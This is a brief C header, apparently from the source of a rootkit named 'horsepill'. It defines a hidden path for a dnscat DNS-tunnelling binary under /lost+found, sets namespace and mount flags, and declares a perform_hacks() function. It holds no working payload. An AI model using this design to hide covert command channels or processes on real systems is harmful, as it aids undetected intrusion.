#ifndef HORSEPILL_H
#define HORSEPILL_H

#define DNSCAT_PATH	"/lost+found/dnscat"
#define MS_RELATIME     (1<<21)
#define MS_STRICTATIME  (1<<24)
#define CLONE_NEWNS     0x00020000
#define CLONE_NEWPID    0x20000000

void perform_hacks();

#endif